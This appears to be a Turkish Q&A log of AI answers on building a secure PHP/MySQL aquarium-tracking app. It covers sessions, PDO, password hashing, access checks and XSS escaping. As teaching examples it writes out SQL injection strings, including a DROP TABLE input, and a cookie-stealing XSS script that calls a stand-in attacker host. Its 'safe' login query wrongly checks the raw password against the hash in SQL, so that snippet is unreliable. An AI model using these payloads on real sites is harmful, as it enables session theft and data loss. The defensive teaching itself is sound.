Bu dosya, proje geliştirilirken çeşitli yapay zeka araçlarına sorulan soruları ve alınan cevapları içermektedir.
 
---
 
## 📌 Soru 1
**PHP'de kullanıcı girişi yaptıktan sonra bu bilgileri nasıl tutacağım? Her sayfada tekrar veritabanına mı sorgu atmam gerekiyor?**
 
### Cevap
 
Hayır, her sayfada tekrar veritabanına sorgu atmana gerek yok. Bunun için PHP'nin yerleşik **session** (oturum) sistemi kullanılır.
 
Session mantığı şu şekilde çalışır: Kullanıcı giriş yaptığında, kullanıcıya ait bilgileri (id, ad, unvan vb.) sunucu tarafında bir oturum değişkenine yazarsın. Bu değişken sunucuda saklanır ve kullanıcıya küçük bir "anahtar" (session ID) gönderilir. Kullanıcı her yeni sayfaya gittiğinde bu anahtarı taşır, sunucu anahtarla eşleşen oturum verisini bulur ve sen de `$_SESSION` üzerinden o verilere erişirsin.
 
Pratikte şöyle kullanılır:
 
```php
// Giriş işlemi başarılı olduktan sonra (auth.php içinde):
session_start();
$_SESSION['kullanici_id'] = $kullanici['id'];
$_SESSION['ad_soyad']     = $kullanici['ad_soyad'];
$_SESSION['unvan']        = $kullanici['unvan'];
header("Location: ../index.php");
exit;
```
 
Artık projedeki her PHP dosyasının en üstüne `session_start()` yazman yeterli. Sonrasında `$_SESSION['unvan']` gibi değerlere doğrudan erişebilirsin:
 
```php
// index.php, add.php, edit.php — tüm sayfalarda:
session_start();
echo "Hoş geldin, " . $_SESSION['ad_soyad'];
```
 
Önemli bir nokta: `session_start()` çağrısı, sayfada herhangi bir HTML çıktısı üretilmeden önce yapılmalıdır. Eğer öncesinde bir `echo` veya boş satır bile çıktılanırsa PHP hata verir çünkü session, HTTP başlıklarını (headers) değiştirmek zorundadır, başlıklar ise içerik gönderilmeden önce gönderilmek zorundadır.
 
Oturumu kapatmak için de şu üç adım izlenir:
 
```php
session_start();
session_unset();   // Tüm session değişkenlerini temizler
session_destroy(); // Session'ı tamamen yok eder
header("Location: login.php");
exit;
```
 
---
 
## 📌 Soru 2
**Veritabanına bağlanmak için bir `db.php` dosyası yazmam gerekiyor ama PDO nedir, mysql_connect'ten ne farkı var? Neden PDO kullanmalıyım?**
 
### Cevap
 
`mysql_connect` PHP 5.5'te kullanımdan kaldırılmış, PHP 7.0 ile tamamen silinmiş eski bir fonksiyondur. Bugün artık kesinlikle kullanılmamalı.
 
Modern PHP projelerinde iki seçenek var: **MySQLi** ve **PDO**. PDO'nun (PHP Data Objects) tercih edilmesinin birkaç önemli sebebi var:
 
**1. Prepared Statements desteği:** SQL injection saldırılarına karşı en güçlü korumayu sağlar. Kullanıcıdan gelen veriyi sorgunun içine doğrudan yazmak yerine, sorgu yapısını ve veriyi ayrı ayrı veritabanına gönderirsin.
 
**2. Birden fazla veritabanını destekler:** Aynı kod yapısıyla MySQL, PostgreSQL, SQLite gibi farklı veritabanlarına geçiş yapabilirsin.
 
**3. Hata yönetimi daha düzenli:** Exception fırlatma mekanizmasıyla hataları try/catch bloğuyla yakalayabilirsin.
 
Bir `db.php` bağlantı dosyası şu şekilde yazılır:
 
```php
<?php
$host    = 'localhost';
$dbname  = 'akvaryum_db';
$charset = 'utf8mb4';
$user    = 'root';
$pass    = '';
 
$dsn = "mysql:host=$host;dbname=$dbname;charset=$charset";
 
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];
 
try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (PDOException $e) {
    die("Veritabanı bağlantı hatası: " . $e->getMessage());
}
```
 
`PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION` satırı çok önemlidir. Bu sayede veritabanı hataları sessizce geçiştirilmez, PHP Exception fırlatır ve sen de bu hatayı yakalayabilirsin. `PDO::FETCH_ASSOC` ise sorgu sonuçlarını sayısal indeks yerine sütun adıyla (örn. `$row['tur_adi']`) erişilebilir şekilde döndürür, bu çok daha okunabilir bir kod yazmanı sağlar.
 
Bu dosyayı `config/` klasörüne koyup diğer sayfalardan `require_once 'config/db.php'` ile çağırmak, bağlantı kodunu tek bir yerde tutmanı ve istediğinde kolayca değiştirmeni sağlar.
 
---
 
## 📌 Soru 3
**Kullanıcı şifrelerini veritabanına düz metin olarak kaydetmem sakıncalı mı? Nasıl güvenli hale getiririm?**
 
### Cevap
 
Evet, son derece sakıncalıdır. Şifreleri düz metin olarak kaydetmek, veritabanına yetkisiz erişim sağlayan biri için tüm kullanıcı şifrelerini açık etmek demektir. Bu hem ciddi bir güvenlik açığıdır hem de kullanıcıların güvenini kötüye kullanmaktır.
 
PHP'de şifre güvenliği için `password_hash()` ve `password_verify()` fonksiyonları kullanılır. Bu fonksiyonlar PHP 5.5'ten itibaren çekirdekte yer alır, harici kütüphane gerekmez.
 
**Kayıt sırasında (register):**
```php
$sifre_ham    = $_POST['sifre'];                              // Kullanıcının girdiği ham şifre
$sifre_hash   = password_hash($sifre_ham, PASSWORD_DEFAULT); // Güvenli hash
// Bu hash'i veritabanına kaydet
```
 
**Giriş sırasında (login):**
```php
$sifre_ham        = $_POST['sifre'];         // Kullanıcının girdiği şifre
$sifre_veritabani = $kullanici['sifre'];     // DB'den çekilen hash
 
if (password_verify($sifre_ham, $sifre_veritabani)) {
    // Giriş başarılı
} else {
    // Hatalı şifre
}
```
 
`PASSWORD_DEFAULT` algoritması şu an için **bcrypt**'i kullanır. bcrypt'in özelliği, kasıtlı olarak yavaş çalışmasıdır; bu da brute-force saldırılarını zorlaştırır. Ayrıca her şifre için otomatik olarak farklı bir "salt" (tuz) üretir, yani aynı şifre için her çağrıda farklı bir hash oluşturulur. Bu sayede iki kullanıcı aynı şifreyi kullansa bile veritabanında farklı değerler görünür, rainbow table saldırıları işe yaramaz.
 
Veritabanındaki `sifre` sütununun `VARCHAR(255)` olmasına dikkat et. Hash değerleri uzun olabilir ve alan kısıtı olursa hash kesilerek bozulur, o zaman doğru şifreyle bile giriş yapamaz hale gelirsin.
 
---
 
## 📌 Soru 4
**Giriş yapmamış kullanıcıların `index.php` veya `add.php` gibi sayfalara direkt URL yazarak erişmesini nasıl engellerim?**
 
### Cevap
 
Her korumalı sayfanın en üstüne bir oturum kontrolü eklemen gerekir. Bu kontrol, `session_start()` çağrısından hemen sonra yapılmalıdır:
 
```php
<?php
session_start();
 
if (!isset($_SESSION['kullanici_id'])) {
    header("Location: login.php");
    exit;
}
```
 
Burada `exit` çok kritiktir. `header()` fonksiyonu PHP'ye "bu HTTP başlığını gönder" der ama sayfanın çalışmasını durdurmaz. `exit` yazmazsan, yönlendirme başlığı gönderilse bile PHP sayfanın geri kalanını çalıştırmaya devam eder. Bir araçla (örn. Burp Suite gibi proxy yazılımlarıyla) HTTP yanıtını inceleyebilen biri, yönlendirme olmasına rağmen sayfanın tüm HTML içeriğini görebilir. Bu ciddi bir güvenlik açığıdır.
 
Projende `add.php` ve `edit.php` için ekstra bir katman daha var: sadece giriş yapılmış olması yetmez, kullanıcının unvanı da kontrol ediliyor:
 
```php
$yetkisiz_unvanlar = ['Ziyaretçi', 'Temizlik Personeli'];
 
if (isset($_SESSION['unvan']) && in_array($_SESSION['unvan'], $yetkisiz_unvanlar)) {
    header("Location: index.php?hata=yetkisiz");
    exit;
}
```
 
Bu iki katmanlı kontrol iyi bir yaklaşımdır: önce "giriş yapılmış mı?", sonra "bu işlemi yapma yetkisi var mı?" şeklinde sıralanır. Ayrıca `index.php`'de de arayüz katmanında `$_SESSION['unvan']` kontrolü yapılarak yetkisiz kullanıcılara "Yeni Kayıt Ekle" butonu gösterilmiyor. Fakat bu tek başına yeterli değildir, sunucu tarafı kontrolü olmadan sadece HTML'den butonu saklamak gerçek bir güvenlik sağlamaz. Projede doğru şekilde her iki katman da kullanılmış.
 
---
 
## 📌 Soru 5
**Kullanıcıdan gelen form verilerini doğrudan SQL sorgusuna yazarsam ne olur? SQL injection nedir, nasıl önlerim?**
 
### Cevap
 
SQL injection, bir saldırganın form alanına SQL kodu yazarak veritabanı sorgunu manipüle etmesi saldırısıdır. Web'deki en yaygın ve tehlikeli saldırı türlerinden biridir.
 
Şöyle düşün: Giriş formuna e-posta olarak şunu yazan biri olsun:
 
```
' OR '1'='1
```
 
Eğer senin sorgun şu şekilde yazılmışsa:
 
```php
// TEHLİKELİ — asla böyle yazma
$sql = "SELECT * FROM kullanicilar WHERE eposta = '" . $_POST['eposta'] . "'";
```
 
Oluşan sorgu şu hale gelir:
 
```sql
SELECT * FROM kullanicilar WHERE eposta = '' OR '1'='1'
```
 
`'1'='1'` her zaman doğru olduğu için bu sorgu tablodaki tüm kullanıcıları döndürür ve saldırgan şifre bilmeden giriş yapabilir. Daha da tehlikelisi, `; DROP TABLE kullanicilar; --` gibi bir giriş tüm tabloyu silebilir.
 
PDO Prepared Statements kullanarak bu saldırıyı tamamen engellemiş olursun:
 
```php
// GÜVENLİ — prepared statement kullanımı
$sql  = "SELECT * FROM kullanicilar WHERE eposta = :eposta AND sifre_hash = :sifre";
$stmt = $pdo->prepare($sql);
$stmt->execute([':eposta' => $_POST['eposta'], ':sifre' => $_POST['sifre']]);
$kullanici = $stmt->fetch();
```
 
Burada `:eposta` ve `:sifre` birer yer tutucudur. PDO önce sorgunun yapısını veritabanına gönderir, sonra değerleri ayrı bir kanaldan iletir. Veritabanı bu değerleri hiçbir zaman SQL kodu olarak yorumlamaz, her zaman ham veri olarak işler. Kullanıcı ne yazarsa yazsın, SQL yapısını bozamaz.
 
Projende `crud.php` ve `auth.php` dosyalarında tüm sorgular bu şekilde yazılmış olmalıdır. `edit.php`'de URL'den gelen `id` değeri için `intval()` kullanımı da benzer bir önlemdir: `$id = isset($_GET['id']) ? intval($_GET['id']) : 0;` — bu satır, URL'ye yazılan değeri her koşulda tam sayıya dönüştürür.
 
---
 
## 📌 Soru 6
**Formdan gelen verileri sayfada ekrana bastırırken neden `htmlspecialchars()` kullanmam gerekiyor?**
 
### Cevap
 
Bu fonksiyon XSS (Cross-Site Scripting) saldırılarına karşı koruma sağlar. XSS, bir saldırganın veritabanına veya form alanına HTML/JavaScript kodu yazarak başka kullanıcıların tarayıcısında o kodun çalışmasını sağladığı bir saldırıdır.
 
Örnek: Bir kullanıcı "Canlı Türü" alanına şunu yazar:
 
```
<script>document.location='http://saldirgansitesi.com/cookie?c='+document.cookie</script>
```
 
Eğer bunu doğrudan `echo $kayit['tur_adi']` ile sayfaya yazarsan, tarayıcı bunu metin olarak değil HTML olarak yorumlar ve script çalışır. Bu script, o sayfayı görüntüleyen kullanıcının oturum bilgilerini (cookie) saldırgana gönderebilir.
 
`htmlspecialchars()` bu karakterleri HTML varlıklarına (entity) dönüştürür:
 
| Orijinal | Dönüştürülmüş |
|----------|---------------|
| `<`      | `&lt;`        |
| `>`      | `&gt;`        |
| `"`      | `&quot;`      |
| `'`      | `&#039;`      |
| `&`      | `&amp;`       |
 
Böylece tarayıcı bu karakterleri HTML etiketi olarak değil, düz metin olarak gösterir:
 
```php
// Güvenli kullanım
echo htmlspecialchars($kayit['tur_adi'], ENT_QUOTES, 'UTF-8');
```
 
Projende `edit.php` ve `index.php` içinde form alanlarını ve tablo hücrelerini doldururken bu fonksiyon kullanılmış. Özellikle `edit.php`'deki textarea ve input'ların `value` değerlerinde bu kullanım kritiktir çünkü bir tırnak işareti bile input'un `value="..."` yapısını bozabilir.
 
---
 
## 📌 Soru 7
**`header.php` ve `footer.php` gibi ortak dosyaları her sayfaya neden `require_once` ile dahil ediyorum? `include` ile ne farkı var?**
 
### Cevap
 
PHP'de bir dosyayı başka bir dosyaya dahil etmenin dört yolu vardır: `include`, `include_once`, `require`, `require_once`.
 
Farkları şöyle özetlenebilir:
 
- **`include`**: Dosyayı dahil eder. Dosya bulunamazsa sadece **uyarı** (warning) verir ve script çalışmaya devam eder.
- **`require`**: Dosyayı dahil eder. Dosya bulunamazsa **ölümcül hata** (fatal error) verir ve script durur.
- **`include_once`** / **`require_once`**: Aynı işlemi yapar ama dosya daha önce dahil edilmişse tekrar dahil etmez.
`header.php` ve `footer.php` için `require_once` doğru tercihtir, sebepleri şunlar:
 
1. **`require`** kullanıyoruz çünkü bu dosyalar olmadan sayfa anlamlı bir şekilde çalışamaz. `header.php` Bootstrap, Font Awesome CDN linklerini ve navigasyon çubuğunu içeriyor. Bu dosya yüklenemezse sayfanın kırık bir HTML döndürmesi yerine durması daha doğrudur.
2. **`_once`** ekini kullanıyoruz çünkü bir dosya karmaşık yönlendirmeler veya yanlışlıkla iki kez dahil edilirse `session_start()` gibi fonksiyonlar iki kez çağrılır ve hata üretir. `_once` bu riski ortadan kaldırır.
`config/db.php` için de `require_once` kullanımı önemlidir: `$pdo` değişkeni bir kez oluşturulur, aynı script içinde farklı dosyalar bu dosyayı include etse bile bağlantı tek sefer kurulur.
 
---
 
## 📌 Soru 8
**`crud.php` dosyasında kayıt ekleme, güncelleme ve silme işlemlerini URL parametresiyle (`?action=create`) nasıl yöneteceğim? Her işlem için ayrı dosya mı yazmalıyım?**
 
### Cevap
 
Her işlem için ayrı dosya yazmak da çalışır ama tek bir dosyada `action` parametresiyle yönetmek daha düzenli bir yaklaşımdır. Bu pattern "controller" mantığının basit bir uygulamasıdır.
 
`crud.php` içinde yapı şu şekilde kurulur:
 
```php
<?php
session_start();
require_once '../config/db.php';
 
$action = $_GET['action'] ?? '';
 
switch ($action) {
    case 'create':
        // POST verilerini al, doğrula, veritabanına yaz
        $tur_adi      = trim($_POST['tur_adi']);
        $bolum_adi    = trim($_POST['bolum_adi']);
        $tank_no      = trim($_POST['tank_numarasi']);
        $saglik       = $_POST['saglik_durumu'];
        $canli_sayisi = intval($_POST['canli_sayisi']);
        $son_yemleme  = $_POST['son_yemleme'];
        $bakim_notu   = trim($_POST['son_bakim_notu']);
        $personel     = $_SESSION['ad_soyad'] . ' (' . $_SESSION['unvan'] . ')';
 
        $sql  = "INSERT INTO akvaryum_takip 
                 (tur_adi, bolum_adi, tank_numarasi, saglik_durumu, canli_sayisi, son_yemleme, son_bakim_notu, sorumlu_personel)
                 VALUES (:tur, :bolum, :tank, :saglik, :sayi, :yemleme, :not, :personel)";
        $stmt = $pdo->prepare($sql);
        $stmt->execute([
            ':tur'      => $tur_adi,
            ':bolum'    => $bolum_adi,
            ':tank'     => $tank_no,
            ':saglik'   => $saglik,
            ':sayi'     => $canli_sayisi,
            ':yemleme'  => $son_yemleme,
            ':not'      => $bakim_notu,
            ':personel' => $personel,
        ]);
        header("Location: ../index.php?basari=eklendi");
        exit;
 
    case 'update':
        // Güncelleme işlemleri...
        break;
 
    case 'delete':
        // Silme işlemleri...
        break;
 
    default:
        header("Location: ../index.php");
        exit;
}
```
 
Formların `action` attribute'u da buna göre ayarlanır:
 
```html
<!-- add.php içinde -->
<form action="actions/crud.php?action=create" method="POST">
 
<!-- edit.php içinde -->
<form action="actions/crud.php?action=update" method="POST">
```
 
Silme işlemi ise form yerine direkt link üzerinden çağrılır:
 
```html
<a href="actions/crud.php?action=delete&id=<?php echo $kayit['id']; ?>"
   onclick="return confirm('Silmek istediğinize emin misiniz?');">
    Sil
</a>
```
 
`onclick="return confirm(...)"` kısmı tamamen istemci tarafı (JavaScript) bir önlemdir, yanlışlıkla silmeyi engeller. Ama asıl güvenlik sunucu tarafında olmalıdır: silme işlemi öncesinde de oturum ve yetki kontrolü yapılmalıdır.
 
---
 
## 📌 Soru 9
**`index.php`'de kayıt düzenleme ve silme butonlarını Ziyaretçi ve Temizlik Personeli rolündeki kullanıcılara göstermek istemiyorum. PHP ile bunu nasıl yaparım?**
 
### Cevap
 
PHP'de HTML içine koşul blokları ekleyerek bunu kolayca yapabilirsin. `<?php if (...): ?>` ... `<?php endif; ?>` yapısı, HTML şablonları içinde koşullu içerik göstermek için kullanılan standart PHP söz dizimidir:
 
```php
<?php if ($_SESSION['unvan'] !== 'Ziyaretçi' && $_SESSION['unvan'] !== 'Temizlik Personeli'): ?>
    <td class="text-center">
        <a href="edit.php?id=<?php echo $kayit['id']; ?>" class="btn btn-outline-warning btn-sm">
            <i class="fa-solid fa-pen"></i>
        </a>
        <a href="actions/crud.php?action=delete&id=<?php echo $kayit['id']; ?>"
           class="btn btn-outline-danger btn-sm"
           onclick="return confirm('Silmek istediğinize emin misiniz?');">
            <i class="fa-solid fa-trash"></i>
        </a>
    </td>
<?php endif; ?>
```
 
Yalnız burada önemli bir nokta var: Bu yöntem sadece butonları **gizler**, sayfaları korumaz. Yani Ziyaretçi rolündeki biri URL çubuğuna `edit.php?id=5` yazarsa doğrudan o sayfaya ulaşabilir — eğer `edit.php` içinde sunucu tarafı kontrol yoksa.
 
Bu yüzden projede iki ayrı koruma katmanı birlikte kullanılmış:
 
1. **Arayüz katmanı** (`index.php`): Butonlar yetki kontrolüyle koşullu gösteriliyor.
2. **Sunucu katmanı** (`add.php`, `edit.php`): Sayfa en üstte `$_SESSION['unvan']` kontrol ediyor, yetkisiz kullanıcıyı yönlendiriyor.
Bu iki katmanın birlikte olması doğrudur. Sadece arayüzden gizlemek güvenlik açısından yetersizdir, sadece sunucu kontrolü ise kullanıcı deneyimi açısından kötüdür. İkisi birlikte hem güvenli hem kullanışlı bir yapı oluşturur.
 
---
 
## 📌 Soru 10
**Tablo başlığındaki sütun sayısı ile satırlardaki `<td>` sayısı uyuşmuyor gibi görünüyor, bakım notu satırı da tablonun geneline yayılıyor. Bunu nasıl yapıyorum?**
 
### Cevap
 
HTML tablolarında `colspan` attribute'u, bir hücrenin birden fazla sütuna yayılmasını sağlar. Bakım notunu tüm satır geneline yaymak için şu yapı kullanılır:
 
```html
<?php if (!empty($kayit['son_bakim_notu'])): ?>
    <tr class="table-light">
        <td colspan="9" class="ps-4 py-1 text-muted">
            <small>
                <i class="fa-solid fa-comment-medical me-1"></i>
                <strong>Bakım/Teknik Notu:</strong>
                <?php echo htmlspecialchars($kayit['son_bakim_notu']); ?>
            </small>
        </td>
    </tr>
<?php endif; ?>
```
 
Burada `colspan="9"` tablodaki toplam sütun sayısına eşit olmalıdır. Sütun sayısı değişirse bu değer de güncellenmelidir, aksi halde tablo hizalaması bozulur.
 
`!empty()` kontrolü de önemlidir: boş bakım notları için gereksiz satır oluşturulmaz. `empty()` fonksiyonu PHP'de `null`, boş string `""`, `0`, `false` değerlerinin tümü için `true` döndürür, bu yüzden sadece gerçekten içerik varsa bu satır render edilir.
 
Tablonun genel yapısı şu şekilde kurgulanmıştır: her kayıt için ana bir `<tr>` ve opsiyonel olarak bakım notu için ikinci bir `<tr>` oluşturuluyor. Bu "iç içe olmayan, art arda satır" yaklaşımı temiz ve standart bir HTML tablosu yapısını korur.
 
---
 
## 📌 Soru 11
**Bootstrap ile iki form alanını yan yana koymak istiyorum (örneğin Akvaryum Bölümü ve Tank Numarası). Bunu nasıl yaparım?**
 
### Cevap
 
Bootstrap'ın grid sistemi 12 sütunlu bir yapıya dayanır. İki eşit genişlikte alan yan yana koymak için `row` içinde `col-md-6` sınıfını kullanırsın:
 
```html
<div class="row">
    <div class="col-md-6 mb-3">
        <label class="form-label fw-bold">Akvaryum Bölümü</label>
        <select name="bolum_adi" class="form-select" required>
            <!-- seçenekler -->
        </select>
    </div>
    <div class="col-md-6 mb-3">
        <label class="form-label fw-bold">Tank Numarası / Kodu</label>
        <input type="text" name="tank_numarasi" class="form-control" required>
    </div>
</div>
```
 
`col-md-6` şu anlama gelir: ekran genişliği `md` (medium, 768px) ve üzerindeyken bu sütun 12 birimlik ızgaranın 6'sını kaplar, yani yarısını. İki `col-md-6` yan yana gelince tam satırı doldurur. `md`'nin altındaki ekranlarda (mobil) ise her sütun otomatik olarak tam genişliğe (12 birim) geçer, formlar alt alta dizilir.
 
Eğer üç alan yan yana isteseydin `col-md-4` kullanırdın (4+4+4=12). Dört alan için `col-md-3`. Eşit olmayan bölünme de mümkündür, örneğin `col-md-8` ve `col-md-4`.
 
`mb-3` sınıfı ise her form grubunun altına margin (boşluk) ekler. Bootstrap'ta `mb` = margin-bottom, `3` = 1rem boşluk anlamına gelir. Bu sınıf olmadan form elemanları üst üste yapışık görünür.
 
---
 
## 📌 Soru 12
**`edit.php`'de select kutusundaki seçili değerin veritabanından çekilen değerle eşleşmesini nasıl sağlıyorum?**
 
### Cevap
 
Her `<option>` için PHP ile koşullu `selected` attribute'u ekliyorsun. Mantık şu: veritabanından gelen değer, bu seçeneğin value'suyla aynı mı? Aynıysa `selected` yaz, değilse boş bırak.
 
```php
<select name="saglik_durumu" class="form-select">
    <option value="Sağlıklı"
        <?php echo $kayit['saglik_durumu'] === 'Sağlıklı' ? 'selected' : ''; ?>>
        Sağlıklı
    </option>
    <option value="Karantinada"
        <?php echo $kayit['saglik_durumu'] === 'Karantinada' ? 'selected' : ''; ?>>
        Karantinada
    </option>
    <option value="Tedavi Altında"
        <?php echo $kayit['saglik_durumu'] === 'Tedavi Altında' ? 'selected' : ''; ?>>
        Tedavi Altında
    </option>
</select>
```
 
Burada `? 'selected' : ''` PHP'nin ternary (üçlü) operatörüdür. Şu anlama gelir: "Koşul doğruysa 'selected' döndür, yanlışsa boş string döndür." Uzun hali şöyle olurdu:
 
```php
if ($kayit['saglik_durumu'] === 'Sağlıklı') {
    echo 'selected';
} else {
    echo '';
}
```
 
`===` (üç eşittir) operatörü hem değeri hem de veri tipini karşılaştırır. `==` (iki eşittir) sadece değeri karşılaştırır ve PHP'nin esnek tip dönüşümleri nedeniyle beklenmedik sonuçlar üretebilir. Karşılaştırmalarda `===` kullanmak her zaman daha güvenlidir.
 
`datetime-local` input tipi için ise tarih formatını dönüştürmen gerekir. MySQL tarihi `YYYY-MM-DD HH:MM:SS` formatında saklar, ama HTML `datetime-local` inputu `YYYY-MM-DDTHH:MM` formatını bekler:
 
```php
<input type="datetime-local" name="son_yemleme"
    value="<?php echo $kayit['son_yemleme']
        ? date('Y-m-d\TH:i', strtotime($kayit['son_yemleme']))
        : date('Y-m-d\TH:i'); ?>">
```
 
`strtotime()` MySQL tarih stringini Unix timestamp'e çevirir, `date()` ise bu timestamp'i istediğin formata biçimlendirir. `\T` kısmındaki ters slash, `T` harfinin bir format karakteri olarak değil literal karakter olarak yorumlanmasını sağlar.
EOF
